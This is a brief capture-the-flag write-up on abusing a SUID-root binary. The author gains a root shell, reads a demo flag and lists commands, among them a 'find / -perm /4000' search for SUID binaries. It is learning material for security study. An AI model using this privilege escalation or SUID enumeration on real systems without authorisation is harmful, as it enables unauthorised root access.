# Challenge Highlight — SUID Binary Abuse

# The Scenario
A binary had SUID permissions set. Goal: read a flag owned by root as a normal user.

# My Approach
$ ls -la /challenge/run
-rwsr-xr-x 1 root root 12345 Jun 2026 /challenge/run

The 's' in 'rws' = SUID bit. Runs as root regardless of who executes it.

$ /challenge/run
# whoami
root
# cat /flag
pwn.college{fake_flag_for_demo}

# What I Learned
SUID lets users run a file with the owner's permissions. Misconfigured on shell binaries = trivial privilege escalation. This is exactly what GTFOBins catalogues.

# Key Commands
ls -la             → list files with permissions
chmod              → change file permissions
find / -perm /4000 → find all SUID binaries
cat /proc/self/status → inspect current process

# Takeaway
You can't defend what you don't understand. Knowing SUID means I can spot misconfigured permissions in a real environment.
